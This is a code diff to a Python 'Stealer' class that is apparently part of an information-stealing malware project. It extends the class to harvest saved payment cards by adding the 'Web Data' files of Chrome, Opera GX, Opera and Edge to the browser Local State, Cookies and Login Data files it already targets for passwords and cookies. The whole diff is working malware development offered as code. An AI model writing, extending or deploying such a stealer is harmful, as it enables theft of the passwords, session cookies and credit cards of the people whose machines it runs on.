@@ -16,19 +16,19 @@ class Stealer(Thread):
 
         self.token = token
         self.user_id = user_id
-
-        self.passwords = kwargs["passwords"] if "passwords" in kwargs else True
-        self.processes = kwargs["processes"] if "processes" in kwargs else True
-        self.cookies = kwargs["cookies"] if "cookies" in kwargs else True
-        self.system = kwargs["system"] if "system" in kwargs else True
-        self.screen = kwargs["screen"] if "screen" in kwargs else True
-
         self.errors = errors
 
         self.user = getuser()
         self.zip_name = f"{self.user}-st"
         self.storage_path = f"C:/Users/{self.user}/AppData/"
         self.storage_folder = "stink/"
+
+        for status in ["system", "screen", "cookies", "passwords", "processes", "cards"]:
+
+            if status in kwargs:
+                self.__dict__.update({status: kwargs[status]})
+            else:
+                self.__dict__.update({status: True})
 
         self.methods = [
             {
@@ -39,8 +39,9 @@ class Stealer(Thread):
                     rf"{environ['USERPROFILE']}{sep}AppData\Local\Google\Chrome\User Data\Local State",
                     rf"{environ['USERPROFILE']}{sep}AppData\Local\Google\Chrome\User Data\Default\Cookies",
                     rf"{environ['USERPROFILE']}{sep}AppData\Local\Google\Chrome\User Data\Default\Login Data",
+                    rf"{environ['USERPROFILE']}{sep}AppData\Local\Google\Chrome\User Data\Default\Web Data",
                     rf"{environ['USERPROFILE']}{sep}AppData\Local\Google\Chrome\User Data\Default\Network\Cookies",
-                    (self.passwords, self.cookies),
+                    (self.passwords, self.cookies, self.cards),
                     self.errors
                 )
             },
@@ -52,8 +53,9 @@ class Stealer(Thread):
                     rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera GX Stable\Local State",
                     rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera GX Stable\Cookies",
                     rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera GX Stable\Login Data",
+                    rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera GX Stable\Web Data",
                     "",
-                    (self.passwords, self.cookies),
+                    (self.passwords, self.cookies, self.cards),
                     self.errors
                 )
             },
@@ -65,8 +67,9 @@ class Stealer(Thread):
                     rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera Stable\Local State",
                     rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera Stable\Cookies",
                     rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera Stable\Login Data",
+                    rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera Stable\Web Data",
                     "",
-                    (self.passwords, self.cookies),
+                    (self.passwords, self.cookies, self.cards),
                     self.errors
                 )
             },
@@ -78,8 +81,9 @@ class Stealer(Thread):
                     rf"{environ['USERPROFILE']}{sep}AppData\Local\Microsoft\Edge\User Data\Local State",
                     rf"{environ['USERPROFILE']}{sep}AppData\Local\Microsoft\Edge\User Data\Default\Cookies",
                     rf"{environ['USERPROFILE']}{sep}AppData\Local\Microsoft\Edge\User Data\Default\Login Data",
+                    rf"{environ['USERPROFILE']}{sep}AppData\Local\Microsoft\Edge\User Data\Default\Web Data",
                     "",
-                    (self.passwords, self.cookies),
+                    (self.passwords, self.cookies, self.cards),
                     self.errors
                 )
             },
